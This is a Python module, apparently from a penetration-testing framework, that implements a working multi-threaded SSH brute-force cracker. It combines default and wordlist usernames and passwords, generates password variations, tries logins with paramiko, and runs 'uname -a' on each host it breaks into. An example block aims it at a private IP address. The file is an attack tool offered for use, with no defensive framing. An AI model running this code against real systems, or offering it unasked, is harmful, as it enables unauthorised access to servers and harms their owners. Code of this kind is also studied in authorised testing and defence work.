#!/usr/bin/env python3
"""
SSH Brute Force Cracker
=======================

Advanced SSH brute force module with intelligent password generation,
rate limiting, and multiple attack strategies.

Author: Brainless Security Team
Module: auxiliary/cracker/ssh_bruteforce
Type: auxiliary
Rank: excellent
"""

import os
import sys
import socket
import threading
import time
import paramiko
from pathlib import Path

# Add framework path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from core.logger import LoggerMixin

NAME = "SSH Brute Force Cracker"
DESCRIPTION = "Advanced SSH brute force with intelligent password generation and rate limiting"
AUTHOR = "Brainless Security Team"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "auxiliary"

class SSHBruteforce(LoggerMixin):
    """
    Advanced SSH brute force cracker with multiple attack strategies
    """
    
    def __init__(self):
        super().__init__('SSHBruteforce')
        self.target = None
        self.port = 22
        self.usernames = []
        self.passwords = []
        self.wordlist = None
        self.username_wordlist = None
        self.threads = 10
        self.timeout = 10
        self.delay = 1
        self.max_attempts = 1000
        self.strategy = 'default'
        self.results = []
        self.lock = threading.Lock()
        self.attempt_count = 0
        self.success_count = 0
        
        # Common usernames and passwords
        self.default_usernames = [
            'root', 'admin', 'administrator', 'user', 'test', 'guest',
            'ubuntu', 'debian', 'centos', 'oracle', 'fedora', 'redhat'
        ]
        
        self.default_passwords = [
            'password', '123456', 'admin', 'root', 'toor', 'test',
            'password123', 'admin123', 'root123', 'welcome',
            'qwerty', 'abc123', 'letmein', 'monkey', 'dragon'
        ]
    
    def set_option(self, option: str, value: str):
        """Set module options"""
        if option.lower() == 'target':
            self.target = value
        elif option.lower() == 'port':
            self.port = int(value)
        elif option.lower() == 'usernames':
            self.usernames = value.split(',')
        elif option.lower() == 'passwords':
            self.passwords = value.split(',')
        elif option.lower() == 'wordlist':
            self.wordlist = value
        elif option.lower() == 'username_wordlist':
            self.username_wordlist = value
        elif option.lower() == 'threads':
            self.threads = int(value)
        elif option.lower() == 'timeout':
            self.timeout = int(value)
        elif option.lower() == 'delay':
            self.delay = float(value)
        elif option.lower() == 'max_attempts':
            self.max_attempts = int(value)
        elif option.lower() == 'strategy':
            self.strategy = value.lower()
    
    def get_options(self) -> dict:
        """Get module options"""
        return {
            'TARGET': {'description': 'Target IP address', 'required': True, 'default': ''},
            'PORT': {'description': 'SSH port (default: 22)', 'required': False, 'default': '22'},
            'USERNAMES': {'description': 'Comma-separated list of usernames', 'required': False, 'default': 'root,admin,ubuntu'},
            'PASSWORDS': {'description': 'Comma-separated list of passwords', 'required': False, 'default': 'password,admin,root'},
            'WORDLIST': {'description': 'Password wordlist file', 'required': False, 'default': ''},
            'USERNAME_WORDLIST': {'description': 'Username wordlist file', 'required': False, 'default': ''},
            'THREADS': {'description': 'Number of threads', 'required': False, 'default': '10'},
            'TIMEOUT': {'description': 'Connection timeout in seconds', 'required': False, 'default': '10'},
            'DELAY': {'description': 'Delay between attempts in seconds', 'required': False, 'default': '1'},
            'MAX_ATTEMPTS': {'description': 'Maximum number of attempts', 'required': False, 'default': '1000'},
            'STRATEGY': {'description': 'Attack strategy (default, password_only, username_only, hybrid)', 'required': False, 'default': 'default'}
        }
    
    def load_wordlist(self, filename: str) -> list:
        """
        Load words from a wordlist file
        """
        words = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    word = line.strip()
                    if word and not word.startswith('#'):
                        words.append(word)
            self.info(f"Loaded {len(words)} entries from {filename}")
        except Exception as e:
            self.error(f"Failed to load wordlist {filename}: {e}")
        
        return words
    
    def generate_password_variations(self, base_password: str) -> list:
        """
        Generate variations of a base password
        """
        variations = [base_password]
        
        # Add common variations
        variations.append(base_password + '123')
        variations.append(base_password + '1')
        variations.append(base_password + '!')
        variations.append(base_password.upper())
        variations.append(base_password.capitalize())
        variations.append(base_password[::-1])  # Reverse
        
        # Add year variations
        current_year = str(time.localtime().tm_year)
        variations.append(base_password + current_year)
        variations.append(base_password + current_year[-2:])
        
        return variations
    
    def generate_smart_passwords(self) -> list:
        """
        Generate intelligent password combinations
        """
        smart_passwords = []
        
        # Combine usernames with common patterns
        for username in self.usernames:
            smart_passwords.extend(self.generate_password_variations(username))
            smart_passwords.extend(self.generate_password_variations(username + '123'))
        
        # Add service-specific passwords
        service_names = ['ssh', 'admin', 'root', 'system']
        for service in service_names:
            for username in self.usernames[:3]:  # Limit to first 3 usernames
                smart_passwords.append(f"{username}{service}")
                smart_passwords.append(f"{service}{username}")
        
        # Remove duplicates
        smart_passwords = list(set(smart_passwords))
        
        return smart_passwords
    
    def test_ssh_connection(self, username: str, password: str) -> dict:
        """
        Test SSH connection with given credentials
        """
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            start_time = time.time()
            
            client.connect(
                self.target,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout
            )
            
            end_time = time.time()
            
            # Connection successful
            result = {
                'success': True,
                'username': username,
                'password': password,
                'response_time': round(end_time - start_time, 2),
                'timestamp': time.time()
            }
            
            # Try to get system info
            try:
                stdin, stdout, stderr = client.exec_command('uname -a', timeout=5)
                result['system_info'] = stdout.read().decode().strip()
            except:
                pass
            
            client.close()
            
            with self.lock:
                self.success_count += 1
            
            return result
            
        except paramiko.AuthenticationException:
            return {'success': False, 'username': username, 'password': password, 'error': 'Authentication failed'}
        except paramiko.SSHException as e:
            return {'success': False, 'username': username, 'password': password, 'error': f'SSH Error: {str(e)}'}
        except socket.timeout:
            return {'success': False, 'username': username, 'password': password, 'error': 'Connection timeout'}
        except Exception as e:
            return {'success': False, 'username': username, 'password': password, 'error': str(e)}
    
    def worker_thread(self, credentials_queue):
        """
        Worker thread for processing credentials
        """
        while True:
            try:
                username, password = credentials_queue.get(timeout=1)
                
                with self.lock:
                    self.attempt_count += 1
                    current_attempt = self.attempt_count
                
                if current_attempt > self.max_attempts:
                    credentials_queue.task_done()
                    break
                
                # Rate limiting
                if self.delay > 0:
                    time.sleep(self.delay)
                
                result = self.test_ssh_connection(username, password)
                
                if result['success']:
                    with self.lock:
                        self.results.append(result)
                    self.info(f"SUCCESS: {username}:{password} @ {self.target}:{self.port}")
                else:
                    self.debug(f"FAILED: {username}:{password} - {result.get('error', 'Unknown error')}")
                
                credentials_queue.task_done()
                
                # Stop if we found credentials
                if len(self.results) >= 5:  # Limit successful results
                    break
                
            except:
                break
    
    def create_credentials_queue(self) -> list:
        """
        Create queue of credentials to test
        """
        credentials = []
        
        # Load usernames
        if self.username_wordlist:
            self.usernames.extend(self.load_wordlist(self.username_wordlist))
        elif not self.usernames:
            self.usernames = self.default_usernames
        
        # Load passwords
        if self.wordlist:
            self.passwords.extend(self.load_wordlist(self.wordlist))
        elif not self.passwords:
            self.passwords = self.default_passwords
        
        # Apply strategy
        if self.strategy == 'password_only':
            # Test each password against first username
            test_usernames = self.usernames[:1] if self.usernames else ['root']
            for password in self.passwords:
                for username in test_usernames:
                    credentials.append((username, password))
        
        elif self.strategy == 'username_only':
            # Test each username with first password
            test_passwords = self.passwords[:1] if self.passwords else ['password']
            for username in self.usernames:
                for password in test_passwords:
                    credentials.append((username, password))
        
        elif self.strategy == 'hybrid':
            # Smart password generation
            smart_passwords = self.generate_smart_passwords()
            for username in self.usernames:
                for password in smart_passwords:
                    credentials.append((username, password))
        
        else:  # default strategy
            # Cartesian product
            for username in self.usernames:
                for password in self.passwords:
                    credentials.append((username, password))
                    if len(credentials) >= self.max_attempts:
                        break
                if len(credentials) >= self.max_attempts:
                    break
        
        self.info(f"Generated {len(credentials)} credential combinations")
        return credentials
    
    def run_attack(self) -> dict:
        """
        Run the brute force attack
        """
        if not self.target:
            return {'success': False, 'message': 'Target not specified'}
        
        try:
            # Test if target is reachable
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result != 0:
                return {'success': False, 'message': f'Target {self.target}:{self.port} is not reachable'}
            
            self.info(f"Starting SSH brute force against {self.target}:{self.port}")
            self.info(f"Strategy: {self.strategy}, Threads: {self.threads}, Max attempts: {self.max_attempts}")
            
            # Create credentials queue
            credentials = self.create_credentials_queue()
            
            if not credentials:
                return {'success': False, 'message': 'No credentials to test'}
            
            # Start worker threads
            from queue import Queue
            credentials_queue = Queue()
            
            for cred in credentials:
                credentials_queue.put(cred)
            
            threads = []
            for _ in range(min(self.threads, len(credentials))):
                t = threading.Thread(target=self.worker_thread, args=(credentials_queue,), daemon=True)
                t.start()
                threads.append(t)
            
            # Wait for completion
            start_time = time.time()
            credentials_queue.join()
            end_time = time.time()
            
            # Generate results
            attack_time = round(end_time - start_time, 2)
            
            summary = {
                'target': self.target,
                'port': self.port,
                'strategy': self.strategy,
                'total_attempts': self.attempt_count,
                'successful_attempts': self.success_count,
                'attack_time': attack_time,
                'results': self.results
            }
            
            self.info(f"Attack completed in {attack_time}s")
            self.info(f"Total attempts: {self.attempt_count}, Successes: {self.success_count}")
            
            return {'success': True, 'summary': summary}
            
        except Exception as e:
            self.error(f"Brute force attack failed: {e}")
            return {'success': False, 'message': f'Attack failed: {str(e)}'}
    
    def run(self) -> dict:
        """
        Main module execution
        """
        return self.run_attack()


def run(options: dict = None) -> dict:
    """
    Entry point for the module
    """
    cracker = SSHBruteforce()
    
    # Set options if provided
    if options:
        for key, value in options.items():
            cracker.set_option(key, value)
    
    return cracker.run()


if __name__ == '__main__':
    # Example usage
    options = {
        'TARGET': '192.168.1.100',
        'PORT': '22',
        'USERNAMES': 'root,admin,ubuntu',
        'PASSWORDS': 'password,admin,root,123456',
        'THREADS': '10',
        'TIMEOUT': '10',
        'DELAY': '0.5',
        'MAX_ATTEMPTS': '500',
        'STRATEGY': 'default'
    }
    
    result = run(options)
    print(result)